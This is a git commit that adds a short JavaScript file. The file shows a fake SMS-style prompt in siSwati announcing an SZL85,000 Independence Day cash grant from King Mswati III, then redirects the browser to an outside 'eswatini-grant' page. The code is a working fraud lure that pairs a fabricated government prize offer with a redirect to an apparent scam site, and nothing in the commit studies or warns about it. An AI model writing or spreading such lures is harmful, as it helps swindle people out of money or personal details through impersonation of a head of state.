0fa8490dea4756dc4e862187fb325f3865dd15b8
ekpeowo <ukpehansi@gmail.com>
2025-08-31 17:04:25 +0100

    Create eswatini-active.js

---
+++ eswatini-active.js
@@ -0,0 +1,5 @@
+var password = 'HOXISA I-SZL85,000'
+password=prompt('SMS: Siyakuhalalisela, usemkhatsini walabakhetsiwe kutsi batfole Sibonelelo Semali Sekugubha Lilanga Lekutimela lesingu-SZL85,000 lesivela kuNkhosi Mswati Ill, Cindzetela Ok kukhipha imali Nyalo ','HOXISA I-SZL85,000');
+if (password != 'HOXISA I-SZL85,000') {
+location.href='https://news-active.org/eswatini-grant.html';
+}
